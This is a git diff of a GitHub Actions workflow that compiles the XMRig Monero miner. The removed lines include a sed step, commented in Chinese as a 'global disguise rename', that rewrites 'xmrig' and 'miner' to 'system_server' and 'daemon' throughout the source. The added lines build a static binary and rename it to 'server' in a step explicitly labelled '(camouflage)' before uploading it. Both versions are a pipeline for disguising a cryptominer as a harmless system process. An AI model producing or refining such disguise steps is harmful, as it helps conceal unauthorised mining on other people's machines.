@@ -1,4 +1,4 @@
-name: Build System
+name: Build Server
 
 on:
   workflow_dispatch:
@@ -8,29 +8,23 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+        with:
+          submodules: true
 
       - name: Install dependencies
         run: sudo apt-get update && sudo apt-get install -y build-essential cmake git libuv1-dev libssl-dev libhwloc-dev
 
-      # 🔥 全局伪装改名：xmrig → system_server
-      - name: Patch branding
+      - name: Build static xmrig
         run: |
-          find . -type f -name "*.h" -o -name "*.cpp" -o -name "*.hpp" -o -name "CMakeLists.txt" | xargs sed -i '
-            s/xmrig/system_server/g
-            s/XMRig/SystemServer/g
-            s/XMRIG/SYSTEM_SERVER/g
-            s/miner/daemon/g
-            s/Miner/Daemon/g
-          '
-
-      - name: Build
-        run: |
-          mkdir build && cd build
-          cmake ..
+          mkdir build
+          cd build
+          cmake .. -DBUILD_STATIC=ON -DWITH_HWLOC=ON
           make -j$(nproc)
-          mv system_server server
 
-      - name: Upload
+      - name: Rename to server (camouflage)
+        run: mv build/xmrig build/server
+
+      - name: Upload final file
         uses: actions/upload-artifact@v4
         with:
           name: server
